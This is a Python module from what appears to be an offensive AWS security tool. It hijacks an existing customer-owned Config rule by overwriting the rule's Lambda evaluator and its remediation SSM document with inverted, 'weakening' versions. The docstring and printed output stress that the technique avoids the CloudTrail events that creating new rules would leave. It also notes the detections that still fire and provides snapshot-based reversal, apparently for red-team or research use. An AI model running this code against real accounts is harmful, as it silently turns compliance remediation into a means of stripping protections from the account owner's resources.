"""
hijack.py — v2 parasitic takeover of an existing customer-owned Config rule.

Instead of creating new Config rules (v1, which emits PutConfigRule in CloudTrail),
hijack mutates the Lambda code and SSM document backing an *existing* custom rule.

Events emitted on a full hijack:
  - lambda:UpdateFunctionCode20150331v2
  - ssm:UpdateDocument
  - ssm:UpdateDocumentDefaultVersion

Events NOT emitted (the stealth win over v1):
  - config:PutConfigRule
  - config:PutRemediationConfigurations
  - lambda:CreateFunction
  - ssm:CreateDocument
  - iam:CreateRole / iam:AttachRolePolicy

This is not invisible. Splunk ESCU ships an "AWS Lambda UpdateFunctionCode"
analytic, CodeSha256 is exposed via lambda:GetFunction, and
IaC pipelines that manage the target Lambda or SSM doc will flag drift on their
next plan. The behavioural 'undo delta' detector in `mirage detect` also still
fires — it keys off SSM-execution-vs-user-hardening, not rule provenance.
"""
import os
import json
import base64
import urllib.request
import datetime as _dt

import boto3
from botocore.exceptions import ClientError

from .constants import RULES, lambda_function_name_from_arn
from .deploy import _zip_lambda
from .remediation import DOCS


BACKUP_ROOT = os.path.expanduser("~/.mirage/backups")


def _snapshot_dir(account_id: str, region: str, rule_name: str) -> str:
    safe_rule = rule_name.replace("/", "_")
    return os.path.join(BACKUP_ROOT, f"{account_id}-{region}-{safe_rule}")


def _snapshot_path(account_id: str, region: str, rule_name: str) -> str:
    d = _snapshot_dir(account_id, region, rule_name)
    ts = _dt.datetime.utcnow().strftime("%Y%m%dT%H%M%SZ")
    os.makedirs(d, exist_ok=True)
    return os.path.join(d, f"{ts}.json")


def _existing_snapshots(account_id: str, region: str, rule_name: str) -> list:
    d = _snapshot_dir(account_id, region, rule_name)
    if not os.path.isdir(d):
        return []
    return sorted([
        os.path.join(d, f) for f in os.listdir(d) if f.endswith(".json")
    ])


def _download_lambda_zip(lam, function_name: str) -> bytes:
    resp = lam.get_function(FunctionName=function_name)
    url = resp["Code"]["Location"]
    with urllib.request.urlopen(url) as r:
        return r.read()


def _describe_rule_and_remediation(config, rule_name: str):
    rule_resp = config.describe_config_rules(ConfigRuleNames=[rule_name])
    if not rule_resp.get("ConfigRules"):
        raise RuntimeError(f"Config rule '{rule_name}' not found in this region.")
    rule = rule_resp["ConfigRules"][0]

    rem_resp = config.describe_remediation_configurations(ConfigRuleNames=[rule_name])
    rems = rem_resp.get("RemediationConfigurations", [])
    remediation = rems[0] if rems else None
    return rule, remediation


def _preflight(rule: dict, remediation, rule_name: str, skip_ssm: bool):
    """Reject unsuitable targets before any mutation."""
    source = rule.get("Source", {})
    owner = source.get("Owner")
    if owner == "AWS":
        raise RuntimeError(
            f"Rule '{rule_name}' is AWS-managed (Owner=AWS). "
            "Cannot hijack — evaluator is AWS-owned."
        )
    if owner != "CUSTOM_LAMBDA":
        raise RuntimeError(
            f"Rule '{rule_name}' has Source.Owner='{owner}'. "
            "Hijack requires CUSTOM_LAMBDA (a customer-owned Lambda evaluator)."
        )
    if not remediation:
        raise RuntimeError(
            f"Rule '{rule_name}' has no remediation configuration. "
            "Hijack requires an existing auto-remediation to parasitise."
        )
    if not skip_ssm:
        if remediation.get("TargetType") != "SSM_DOCUMENT":
            raise RuntimeError(
                f"Rule '{rule_name}' remediation TargetType is "
                f"'{remediation.get('TargetType')}' (not SSM_DOCUMENT). Unsupported."
            )
        doc_name = remediation.get("TargetId", "")
        if doc_name.startswith("AWS-") or doc_name.startswith("AWSConfigRemediation-"):
            raise RuntimeError(
                f"Remediation doc '{doc_name}' is AWS-owned. UpdateDocument is "
                "not permitted on AWS-managed documents. Pick a rule whose "
                "remediation uses a customer-owned SSM doc, or use --skip-ssm."
            )


def hijack(
    rule_name: str,
    target: str,
    region: str,
    verbose: bool = False,
    skip_lambda: bool = False,
    skip_ssm: bool = False,
):
    """
    Parasitise an existing Config rule.

    rule_name  — existing customer-owned Config rule (Source.Owner=CUSTOM_LAMBDA)
    target     — inversion template: s3 | sg | nacl | kms | iam
    skip_lambda — leave evaluator alone (SSM-only, one-shot weakening, not a loop)
    skip_ssm   — leave remediation doc alone (Lambda inversion only)
    """
    if target not in RULES:
        raise RuntimeError(f"Unknown target '{target}'. Valid: {list(RULES.keys())}")
    if skip_lambda and skip_ssm:
        raise RuntimeError("--skip-lambda and --skip-ssm together would be a no-op.")

    def log(msg):
        if verbose:
            print(f"  {msg}")

    sts = boto3.client("sts")
    account_id = sts.get_caller_identity()["Account"]

    config = boto3.client("config", region_name=region)
    lam = boto3.client("lambda", region_name=region)
    ssm = boto3.client("ssm", region_name=region)

    print(f"[mirage hijack] Account: {account_id}  Region: {region}")
    print(f"[mirage hijack] Target rule: {rule_name}  Inversion template: {target}")

    log("Fetching rule and remediation config...")
    rule, remediation = _describe_rule_and_remediation(config, rule_name)
    _preflight(rule, remediation, rule_name, skip_ssm=skip_ssm)

    lambda_arn = rule["Source"]["SourceIdentifier"]
    fn_name = lambda_function_name_from_arn(lambda_arn)
    ssm_doc_name = remediation.get("TargetId") if remediation else None

    log(f"Lambda function:  {fn_name}")
    log(f"Lambda ARN:       {lambda_arn}")
    log(f"SSM document:     {ssm_doc_name}")

    # 1. Check if a snapshot already exists (don't overwrite clean backups)
    existing = _existing_snapshots(account_id, region, rule_name)
    if existing:
        latest = existing[-1]
        print(f"[mirage hijack] Snapshot already exists (not overwriting): {latest}")
        print(f"[mirage hijack] To restore later: mirage restore --rule {rule_name}")
        snap_path = latest
    else:
        # 1b. Snapshot originals (reversibility)
        log("Snapshotting original Lambda zip + SSM doc content...")
        original_zip = _download_lambda_zip(lam, fn_name)
        original_doc_content = ""
        original_doc_format = "YAML"
        original_doc_version = ""
        if ssm_doc_name:
            try:
                doc_resp = ssm.get_document(Name=ssm_doc_name, DocumentFormat="YAML")
                original_doc_content = doc_resp.get("Content", "")
                original_doc_format = doc_resp.get("DocumentFormat", "YAML")
                original_doc_version = doc_resp.get("DocumentVersion", "")
            except ClientError as e:
                # Try JSON format as a fallback for docs originally authored in JSON
                if e.response["Error"]["Code"] in ("InvalidDocument", "InvalidDocumentContent"):
                    doc_resp = ssm.get_document(Name=ssm_doc_name, DocumentFormat="JSON")
                    original_doc_content = doc_resp.get("Content", "")
                    original_doc_format = doc_resp.get("DocumentFormat", "JSON")
                    original_doc_version = doc_resp.get("DocumentVersion", "")
                else:
                    raise

        snapshot = {
            "account_id": account_id,
            "region": region,
            "rule_name": rule_name,
            "target_template": target,
            "lambda_function_name": fn_name,
            "lambda_arn": lambda_arn,
            "ssm_doc_name": ssm_doc_name,
            "taken_at_utc": _dt.datetime.utcnow().isoformat() + "Z",
            "original_lambda_zip_b64": base64.b64encode(original_zip).decode("ascii"),
            "original_ssm_doc_content": original_doc_content,
            "original_ssm_doc_format": original_doc_format,
            "original_ssm_doc_version": original_doc_version,
            "skip_lambda": skip_lambda,
            "skip_ssm": skip_ssm,
        }
        snap_path = _snapshot_path(account_id, region, rule_name)
        with open(snap_path, "w") as f:
            json.dump(snapshot, f, indent=2)
        print(f"[mirage hijack] Snapshot: {snap_path}")

    emitted = []

    # 2. Lambda parasite
    if not skip_lambda:
        log(f"UpdateFunctionCode on '{fn_name}' with inverted '{target}' handler...")
        new_zip = _zip_lambda(target)
        lam.update_function_code(FunctionName=fn_name, ZipFile=new_zip)
        lam.get_waiter("function_updated").wait(FunctionName=fn_name)
        print(f"[mirage hijack] Lambda inverted: {fn_name}")
        emitted.append("lambda:UpdateFunctionCode20150331v2")
    else:
        print(f"[mirage hijack] Lambda skipped (--skip-lambda)")

    # 3. SSM parasite
    if not skip_ssm and ssm_doc_name:
        log(f"UpdateDocument on '{ssm_doc_name}' with weakening '{target}' content...")
        new_content = DOCS[target].strip()
        new_version = None
        try:
            upd = ssm.update_document(
                Name=ssm_doc_name,
                Content=new_content,
                DocumentFormat="YAML",
                DocumentVersion="$LATEST",
            )
            new_version = upd["DocumentDescription"]["DocumentVersion"]
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "DuplicateDocumentContent":
                print("[mirage hijack] SSM doc already matches weakening content; "
                      "UpdateDocument skipped (no event emitted).")
            else:
                raise

        if new_version:
            ssm.update_document_default_version(
                Name=ssm_doc_name, DocumentVersion=new_version
            )
            print(f"[mirage hijack] SSM doc poisoned: {ssm_doc_name} "
                  f"(default → v{new_version})")
            emitted.append("ssm:UpdateDocument")
            emitted.append("ssm:UpdateDocumentDefaultVersion")
    else:
        print(f"[mirage hijack] SSM skipped (--skip-ssm)")

    print("\n[mirage hijack] Events emitted in this run:")
    if emitted:
        for e in emitted:
            print(f"  - {e}")
    else:
        print("  (none - all operations were skipped or already applied)")
    print("[mirage hijack] NOT emitted: config:PutConfigRule, "
          "config:PutRemediationConfigurations,")
    print("                             lambda:CreateFunction, ssm:CreateDocument,")
    print("                             iam:CreateRole, iam:AttachRolePolicy.")
    print(f"\n[mirage hijack] To reverse:  mirage restore --snapshot {snap_path}")
